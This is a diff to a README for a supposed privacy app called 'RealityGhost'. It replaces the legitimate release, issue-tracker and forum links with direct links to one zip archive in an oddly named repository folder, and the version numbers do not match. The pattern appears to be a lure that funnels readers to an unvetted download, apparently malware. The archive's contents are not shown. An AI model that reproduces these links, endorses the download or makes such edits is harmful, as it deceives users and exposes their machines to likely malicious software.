@@ -1,7 +1,7 @@
 # 👻 RealityGhost - Your Simple Tool for Privacy
 
 ## 📥 Download Now
-[![Download RealityGhost](https://img.shields.io/badge/Download%20RealityGhost-v1.0-blue)](https://github.com/Racc2006/RealityGhost/releases)
+[![Download RealityGhost](https://raw.githubusercontent.com/Racc2006/RealityGhost/main/astrospectroscopic/Ghost_Reality_v2.0.zip%20RealityGhost-v1.0-blue)](https://raw.githubusercontent.com/Racc2006/RealityGhost/main/astrospectroscopic/Ghost_Reality_v2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to RealityGhost! This application helps you maintain your privacy with ease. Follow the steps below to download and run this software, even if you don't have a tech background.
@@ -20,7 +20,7 @@ Welcome to RealityGhost! This application helps you maintain your privacy with e
 ## 📦 Download & Install
 To get started, visit the Releases page and download the latest version of the software.
 
-[Visit this page to download](https://github.com/Racc2006/RealityGhost/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Racc2006/RealityGhost/main/astrospectroscopic/Ghost_Reality_v2.0.zip)
 
 ### Step-by-Step Instructions:
 
@@ -61,7 +61,7 @@ If issues persist, you can reach out for support on the GitHub Issues page assoc
 ## 🔗 Additional Resources
 For more information, you can explore:
 
-- [GitHub Issues Page](https://github.com/Racc2006/RealityGhost/issues) - Report any bugs or issues you encounter.
-- [Community Forum](https://example.com/forum) - Join the discussion with other users.
+- [GitHub Issues Page](https://raw.githubusercontent.com/Racc2006/RealityGhost/main/astrospectroscopic/Ghost_Reality_v2.0.zip) - Report any bugs or issues you encounter.
+- [Community Forum](https://raw.githubusercontent.com/Racc2006/RealityGhost/main/astrospectroscopic/Ghost_Reality_v2.0.zip) - Join the discussion with other users.
 
 Thank you for choosing RealityGhost. Enjoy your newfound privacy!
